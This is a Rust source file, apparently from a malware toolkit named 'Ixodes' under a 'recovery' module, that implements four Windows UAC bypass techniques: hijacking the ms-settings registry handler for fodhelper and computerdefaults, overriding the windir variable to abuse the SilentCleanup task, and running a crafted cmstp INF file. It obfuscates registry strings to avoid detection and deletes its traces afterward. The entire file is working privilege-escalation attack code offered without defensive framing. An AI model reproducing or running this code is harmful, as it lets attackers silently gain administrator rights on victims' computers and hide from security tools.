use crate::recovery::helpers::obfuscation::deobf;
use crate::recovery::settings::RecoveryControl;
use std::env;
use std::process::Command;
use tracing::{debug, info, warn};
use winreg::RegKey;
use winreg::enums::*;

pub fn is_admin() -> bool {
    let output = Command::new("net").arg("session").output();

    match output {
        Ok(out) => out.status.success(),
        Err(_) => false,
    }
}

pub async fn attempt_uac_bypass() {
    if !RecoveryControl::global().uac_bypass_enabled() {
        return;
    }

    if is_admin() {
        debug!("already running with administrative privileges");
        return;
    }

    let bypasses = [
        (
            "fodhelper",
            fodhelper_bypass as fn() -> Result<(), Box<dyn std::error::Error>>,
        ),
        ("computerdefaults", computer_defaults_bypass),
        ("silentcleanup", silent_cleanup_bypass),
        ("cmstp", cmstp_bypass),
    ];

    for (name, bypass_fn) in bypasses {
        info!(method = name, "attempting UAC bypass");
        if let Err(err) = bypass_fn() {
            warn!(method = name, error = ?err, "UAC bypass failed");
        } else {
            info!(
                method = name,
                "UAC bypass triggered, exiting current process"
            );
            std::process::exit(0);
        }
    }
}

fn fodhelper_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    // "Software\\Classes\\ms-settings\\Shell\\Open\\command"
    let base_path = deobf(&[
        0x90, 0xD2, 0xDB, 0xC9, 0xCA, 0xDC, 0xCF, 0xD8, 0xE1, 0xF0, 0xD1, 0xDC, 0xCE, 0xCE, 0xD8,
        0xCE, 0xE1, 0xD0, 0xCE, 0x90, 0xCE, 0xD8, 0xC9, 0xC9, 0xD4, 0xD3, 0xDA, 0xCE, 0xE1, 0xED,
        0xCE, 0xD8, 0xD1, 0xD1, 0xE1, 0xF2, 0xCD, 0xD8, 0xD3, 0xE1, 0xDE, 0xD2, 0xD0, 0xD0, 0xDC,
        0xD3, 0xD9,
    ]);
    let (key, _) = hkcu.create_subkey(&base_path)?;

    // "DelegateExecute"
    let delegate_execute = deobf(&[
        0xF7, 0xD8, 0xD1, 0xD8, 0xDA, 0xDC, 0xC9, 0xD8, 0xFA, 0xCB, 0xD8, 0xDE, 0xC8, 0xC9, 0xD8,
    ]);
    key.set_value("", &current_exe)?;
    key.set_value(delegate_execute, &"")?;

    // "fodhelper.exe"
    let fodhelper = deobf(&[
        0xDB, 0xD2, 0xD9, 0xDB, 0xD8, 0xD1, 0xCD, 0xD8, 0xCF, 0x93, 0xD8, 0xC5, 0xD8,
    ]);
    let _ = Command::new(fodhelper).spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = hkcu.delete_subkey_all(deobf(&[
        0x90, 0xD2, 0xDB, 0xC9, 0xCA, 0xDC, 0xCF, 0xD8, 0xE1, 0xF0, 0xD1, 0xDC, 0xCE, 0xCE, 0xD8,
        0xCE, 0xE1, 0xD0, 0xCE, 0x90, 0xCE, 0xD8, 0xC9, 0xC9, 0xD4, 0xD3, 0xDA, 0xCE,
    ]));

    Ok(())
}

fn computer_defaults_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    let base_path = r"Software\Classes\ms-settings\Shell\Open\command";
    let (key, _) = hkcu.create_subkey(base_path)?;

    key.set_value("", &current_exe)?;
    key.set_value("DelegateExecute", &"")?;

    let _ = Command::new("computerdefaults.exe").spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = hkcu.delete_subkey_all(r"Software\Classes\ms-settings");

    Ok(())
}

fn silent_cleanup_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    let (env_key, _) = hkcu.create_subkey("Environment")?;
    let payload = format!("cmd /c start \"\" \"{}\" && rem ", current_exe);
    env_key.set_value("windir", &payload)?;

    let _ = Command::new("schtasks.exe")
        .args(&[
            "/run",
            "/tn",
            "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup",
            "/I",
        ])
        .spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = env_key.delete_value("windir");

    Ok(())
}

fn cmstp_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let temp_dir = env::temp_dir();
    let inf_path = temp_dir.join("ixodes_uac.inf");

    let inf_content = format!(
        r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
RunPostSetupCommands=RunCommand

[RunCommand]
"{}"

[Strings]
ServiceName="Ixodes"
ShortSvcName="Ixodes"
"#,
        current_exe
    );

    std::fs::write(&inf_path, inf_content)?;

    let _ = Command::new("cmstp.exe")
        .args(&["/au", "/s", &inf_path.to_string_lossy()])
        .spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = std::fs::remove_file(&inf_path);

    Ok(())
}
